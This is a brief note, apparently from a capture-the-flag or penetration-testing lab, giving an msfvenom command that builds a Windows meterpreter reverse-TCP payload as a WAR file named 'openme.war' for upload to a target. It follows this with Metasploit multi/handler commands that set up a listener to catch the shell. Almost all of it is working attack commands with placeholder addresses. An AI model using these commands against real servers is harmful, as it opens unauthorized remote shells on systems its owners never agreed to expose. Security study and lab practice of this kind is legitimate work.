```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={local ip} LPORT={choose an open ip} -f war -o openme.war
```

you can upload this file to create a reverse shell

then open metasploit

```
$msfconsole

$use exploit/multi/handler

$set payload windows/x64/meterpreter/reverse_tcp

$set LHOST {local tun0}

$set LPORT {same port msfvenom port}
```

